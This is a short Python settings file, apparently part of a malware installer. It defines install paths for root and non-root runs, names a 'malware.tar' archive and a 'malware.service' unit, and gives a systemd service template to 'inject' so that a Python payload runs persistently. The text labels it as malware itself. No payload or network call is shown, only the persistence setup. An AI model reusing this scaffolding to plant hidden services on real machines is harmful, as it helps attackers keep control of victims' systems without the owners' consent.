#settings if run as root
root = {"targetDir": "/etc/malware/", "serviceLoc": "/etc/systemd/system/"}

#settings if run without root
user = {"targetDir": "~/.malware/", "serviceLoc": "~/.config/systemd/user/"}

#name of serveral files
tarName = "malware.tar"
serviceName = "malware.service"

#service script to inject
service = "[Unit]\nDescription=\"run malware, duhhh\"\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {targetPath}"
